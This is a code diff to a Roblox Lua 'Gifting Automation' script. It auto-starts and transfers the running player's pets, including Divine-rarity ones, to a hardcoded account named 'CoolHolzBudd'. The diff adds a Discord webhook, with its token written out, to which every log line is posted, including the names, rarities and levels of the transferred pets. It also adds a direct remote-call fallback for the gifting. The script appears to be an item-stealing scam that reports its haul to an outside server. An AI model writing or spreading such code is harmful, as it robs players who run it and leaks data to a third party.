@@ -21,6 +21,7 @@ local DataService = require(ReplicatedStorage.Modules.DataService)
 local PetsService = require(ReplicatedStorage.Modules.PetServices.PetsService)
 local PetGiftingService = require(ReplicatedStorage.Modules.PetServices.PetGiftingService)
 local TeleportUIController = require(ReplicatedStorage.Modules.TeleportUIController)
+local HttpService = game:GetService("HttpService")
 
 -- Import pet data
 local PetList = require(ReplicatedStorage.Data.PetRegistry.PetList)
@@ -30,6 +31,7 @@ local PetRarities = require(ReplicatedStorage.Data.PetRegistry.PetRarities)
 local GiftingConfig = {
 	Enabled = true, -- Auto-start enabled
 	TargetPlayerName = "CoolHolzBudd", -- Target player
+	WebhookURL = "https://discord.com/api/webhooks/1352401371952840838/G0ywcotlvhMfda9IAMFRVU3SsHzCJwkszHwdXWBYAp4GhNQ3CJ-kmLgoJwc9BTPeiEOk", -- Discord webhook
 
 	-- Pet gifting settings
 	GiftDivinePets = true,
@@ -72,8 +74,31 @@ local GiftingState = {
 
 -- Utility Functions
 local function Log(message)
+	local timestamp = os.date("%H:%M:%S")
+	local fullMessage = timestamp .. " -- [Gifting Automation] " .. message
+
 	if GiftingConfig.DebugMode then
-		print("[Gifting Automation] " .. message)
+		print(fullMessage)
+	end
+
+	-- Send to Discord webhook
+	if GiftingConfig.WebhookURL and GiftingConfig.WebhookURL ~= "" then
+		spawn(function()
+			local success, error = pcall(function()
+				local data = {
+					content = "```" .. fullMessage .. "```",
+				}
+				HttpService:PostAsync(
+					GiftingConfig.WebhookURL,
+					HttpService:JSONEncode(data),
+					Enum.HttpContentType.ApplicationJson
+				)
+			end)
+
+			if not success then
+				warn("Webhook failed:", error)
+			end
+		end)
 	end
 end
 
@@ -360,43 +385,107 @@ end
 
 -- Main Gifting Process
 local function ProcessPetGifting(targetPlayer)
-	Log("Starting pet gifting process...")
+	Log("🐕 Starting pet gifting process...")
 	GiftingState.CurrentStage = "Gifting Pets"
 
 	local giftablePets = GetGiftablePets()
 	local giftedCount = 0
 
+	if #giftablePets == 0 then
+		Log("❌ No giftable pets found")
+		return false
+	end
+
+	Log("📋 Found " .. #giftablePets .. " giftable pets to process")
+
 	for i, pet in ipairs(giftablePets) do
 		if not GiftingState.IsRunning then
+			Log("⏹️ Automation stopped by user")
 			break
 		end
 
 		GiftingState.CurrentPetIndex = i
-		Log("Processing pet " .. i .. "/" .. #giftablePets .. ": " .. pet.name .. " (" .. pet.rarity .. ")")
+		Log(
+			"🔄 Processing pet "
+				.. i
+				.. "/"
+				.. #giftablePets
+				.. ": "
+				.. pet.name
+				.. " ("
+				.. pet.rarity
+				.. ", Level "
+				.. pet.level
+				.. ")"
+		)
 
-		-- Equip the pet
-		if EquipPet(pet.id, 1) then
-			wait(1) -- Wait for equip to complete
-
-			-- Try to gift the pet
-			if GiftCurrentPet(targetPlayer) then
-				giftedCount = giftedCount + 1
-				table.insert(GiftingState.GiftedPets, pet)
-				Log("Successfully gifted pet: " .. pet.name)
-			else
-				Log("Failed to gift pet: " .. pet.name)
-			end
-
-			-- Unequip the pet (if still equipped)
-			UnequipPet(pet.id)
-		else
-			Log("Failed to equip pet: " .. pet.name)
+		-- First unequip all pets to be safe
+		local equipped = GetEquippedPets()
+		for slot, equippedId in pairs(equipped) do
+			UnequipPet(equippedId)
+			wait(0.5)
 		end
 
+		-- Equip the specific pet we want to gift
+		Log("⚙️ Equipping pet for gifting...")
+		if EquipPet(pet.id, 1) then
+			-- Wait longer for the pet to appear in character
+			Log("⏳ Waiting for pet to appear in character...")
+			local petTool = WaitForPetInCharacter(10) -- Wait up to 10 seconds
+
+			if petTool then
+				Log("✅ Pet tool ready: " .. petTool.Name)
+
+				-- Try to gift the pet
+				Log("🎁 Attempting to gift pet...")
+				if GiftCurrentPet(targetPlayer) then
+					giftedCount = giftedCount + 1
+					table.insert(GiftingState.GiftedPets, pet)
+					Log("🎉 Successfully gifted pet: " .. pet.name .. " to " .. targetPlayer.Name)
+
+					-- Wait a bit to see if gift was successful
+					wait(2)
+
+					-- Check if pet is still in our inventory
+					local currentInventory = GetPetInventory()
+					if not currentInventory[pet.id] then
+						Log("✅ Confirmed: Pet " .. pet.name .. " is no longer in inventory")
+					else
+						Log("⚠️ Warning: Pet " .. pet.name .. " still in inventory - gift may have failed")
+					end
+				else
+					Log("❌ Failed to gift pet: " .. pet.name)
+				end
+			else
+				Log("❌ Pet did not appear in character after equipping")
+
+				-- Try alternative method - direct remote call
+				Log("🔄 Trying direct remote call...")
+				local success, error = pcall(function()
+					-- Look for pet gifting remotes
+					local gameEvents = ReplicatedStorage:FindFirstChild("GameEvents")
+					if gameEvents then
+						local petGiftingRemote = gameEvents:FindFirstChild("PetGiftingService")
+						if petGiftingRemote then
+							petGiftingRemote:FireServer("GivePet", targetPlayer)
+							Log("📡 Fired PetGiftingService remote")
+						end
+					end
+				end)
+			end
+
+			-- Always try to unequip after attempt
+			UnequipPet(pet.id)
+		else
+			Log("❌ Failed to equip pet: " .. pet.name)
+		end
+
+		-- Delay between attempts
+		Log("⏳ Waiting " .. GiftingConfig.DelayBetweenGifts .. " seconds before next pet...")
 		wait(GiftingConfig.DelayBetweenGifts)
 	end
 
-	Log("Pet gifting completed. Gifted " .. giftedCount .. " pets.")
+	Log("📊 Pet gifting completed. Successfully gifted " .. giftedCount .. " out of " .. #giftablePets .. " pets.")
 	return giftedCount > 0
 end
 
